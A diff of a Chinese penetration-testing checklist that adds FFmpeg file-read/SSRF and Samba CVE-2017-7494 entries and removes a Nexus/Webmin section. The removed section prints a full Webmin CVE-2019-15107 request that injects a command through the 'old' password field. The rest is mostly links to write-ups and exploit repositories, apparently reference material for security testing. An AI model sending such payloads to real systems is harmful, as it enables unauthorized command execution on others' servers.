@@ -12,6 +12,20 @@
 **资源**
 - [theLSA/CS-checklist](https://github.com/theLSA/CS-checklist)
 
+## 多媒体
+### FFmpeg
+**任意文件读取**
+- 文章
+    - [FFmpeg任意文件读取漏洞分析](https://www.anquanke.com/post/id/86337)
+
+- POC | Payload | exp
+    - [ffmpeg 任意文件读取漏洞环境](https://vulhub.org/#/environments/ffmpeg/phdays/)
+    - [neex/ffmpeg-avi-m3u-xbin](https://github.com/neex/ffmpeg-avi-m3u-xbin)
+
+**CVE-2016-1897/CVE-2016-1898**
+- 文章
+    - [ffmpeg SSRF漏洞分析](http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
+
 ## 数据库
 ### memcached
 **未授权访问漏洞**
@@ -469,8 +483,17 @@
     ```
 
 **CVE-2017-7494**
+- 简述
+
+    Samba 允许连接一个远程的命名管道，并且在连接前会调用 `is_known_pipename()` 函数验证管道名称是否合法。在 `is_known_pipename()` 函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。
+
+    该漏洞要求的利用条件：
+    - 拥有共享文件写入权限，如：匿名可写等
+    - 需要知道共享目录的物理路径
+
 - 文章
     - [Linux cve-2017-7494samba远程漏洞利用和分析](https://bbs.pediy.com/thread-218114.htm)
+    - [Samba 远程命令执行漏洞（CVE-2017-7494）](https://vulhub.org/#/environments/samba/CVE-2017-7494/)
 
 - POC | Payload | exp
     - [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
@@ -558,62 +581,6 @@
 
 ---
 
-# B/S
-## 仓库
-### Nexus
-**CVE-2019-7238 Nexus Repository Manager 3 Remote Code Execution without authentication < 3.15.0**
-- 文章
-    - [一次偶遇Nexus](https://www.secpulse.com/archives/111818.html)
-
-- POC | Payload | exp
-    - [mpgn/CVE-2019-7238](https://github.com/mpgn/CVE-2019-7238)
-    - [jas502n/CVE-2019-7238](https://github.com/jas502n/CVE-2019-7238)
-
----
-
-## 管理工具
-### Supervisor
-**测试链接**
-- `http://<ip>:9001`
-
-### Webmin
-**CVE-2019-15107**
-- 影响范围
-    - 1.890 through 1.920
-
-- 详情
-    - 在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。
-
-- 文章
-    - [Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究](https://zhuanlan.zhihu.com/p/79287037)
-
-- POC | Payload | exp
-    - [vulhub/webmin/CVE-2019-15107/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/webmin/CVE-2019-15107/README.zh-cn.md)
-    ```
-    POST /password_change.cgi HTTP/1.1
-    Host: your-ip:10000
-    Accept-Encoding: gzip, deflate
-    Accept: */*
-    Accept-Language: en
-    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-    Connection: close
-    Cookie: redirect=1; testing=1; sid=x; sessiontest=1
-    Referer: https://your-ip:10000/session_login.cgi
-    Content-Type: application/x-www-form-urlencoded
-    Content-Length: 60
-
-    user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
-    ```
-
-**CVE-2019-15642 Webmin Remote Code Execution**
-- 影响范围
-    - 1.900 through 1.920
-
-- POC | Payload | exp
-    - [jas502n/CVE-2019-15642](https://github.com/jas502n/CVE-2019-15642)
-
----
-
 # 不太好分
 ## 虚拟化 & 云平台
 **检测虚拟机**
@@ -637,6 +604,7 @@
 **文章**
 - [CitrixReceiver平台的一次渗透测试](https://forum.90sec.com/t/topic/310)
 - [利用Citrix Receiver浏览器进行渗透](https://mp.weixin.qq.com/s/3p7e27JF6NV6C0_DEPiaqg)
+
 ### Docker
 **docker remote api 未授权访问**
 - POC | Payload | exp
